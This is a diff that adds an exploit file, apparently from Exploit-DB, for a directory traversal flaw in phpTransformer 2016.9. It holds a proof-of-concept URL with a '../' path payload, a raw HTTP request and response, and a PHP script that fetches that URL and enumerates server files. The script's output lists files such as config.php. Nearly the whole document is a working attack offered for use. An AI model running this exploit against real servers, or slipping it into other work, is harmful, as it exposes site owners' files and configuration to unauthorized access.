@@ -1,0 +1,74 @@
+# Exploit Title: phpTransformer 2016.9 - Directory Traversal
+# Dork: N/A
+# Date: 2019-01-18
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://phptransformer.com/
+# Software Link: https://netcologne.dl.sourceforge.net/project/phptransformer/Version%202016.9/release_2016.9.zip
+# Version: 2016.9
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/Programs/gallery/admin/jQueryFileUploadmaster/server/php/index.php?path=../../../../../../
+# 
+
+GET /[PATH]/phpTransformer-2016.9-Directory-raversal.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=2hsc4lr80e0lv14jorun0bs390; browserupdateorg=pause; phpwcmsBELang=en; phpwcmsBEItemsPerPage=25; Contemplate=visitor_ID%3DDzk7W2LkwvYjLr4j-20190117235156; phpTransformer=9th36daohkgnuoqm0mmck5her6; phpTransformerSetup=gtaavf8vg8t63s4qhg98q6pi22; TawkConnectionTime=0; __tawkuuid=e::localhost::L/LRDuMLZaB4u3yegW9pKFQGnt3becl4U6WG0DrN27cIjyTFhHLpZf4VKwUqD3qh::2
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+HTTP/1.1 200 OK
+Date: Thu, 17 Jan 2019 23:19:59 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Content-Length: 1535
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<?php
+header ('Content-type: text/html; charset=UTF-8');
+$url= "http://localhost/ExploitDb/release_2016.9/Programs/gallery/admin/jQueryFileUploadmaster/server/php/index.php?path=../../../../../../";
+$url = file_get_contents($url);
+$l = json_decode($url, true);
+if($l){
+echo "*-----------------------------*<br />";
+foreach($l['files'] as $u){
+	echo "[-] Name:" .$u['name']." / Size:" .$u['size']."<br />";
+}
+echo "*-----------------------------*";}
+?>
+
+*-----------------------------*
+[-] Name:ErrorPage.php / Size:1911
+[-] Name:FootContainer.php / Size:968
+[-] Name:Global.php / Size:11020
+[-] Name:LICENSE.md / Size:36552
+[-] Name:MainContainer.php / Size:4365
+[-] Name:MarqueeContainer.php / Size:2394
+[-] Name:MenuContainer.php / Size:1782
+[-] Name:NavCont.php / Size:387
+[-] Name:ProgramsContainer.php / Size:5869
+[-] Name:README.md / Size:286
+[-] Name:SecondairyContainer.php / Size:5169
+[-] Name:Themes.php / Size:6830
+[-] Name:TopContainer.php / Size:1378
+[-] Name:a.php / Size:119
+[-] Name:admin(renamed).php / Size:23841
+[-] Name:animated_favicon.gif / Size:21501
+[-] Name:cache.php / Size:2385
+[-] Name:config.php / Size:997
+[-] Name:favicon.ico / Size:4286
+[-] Name:friendly.php / Size:2047
+[-] Name:gadget.php / Size:2864
+[-] Name:includes.php / Size:1575
+[-] Name:index.php / Size:7343
+[-] Name:l.php / Size:119
+*-----------------------------*
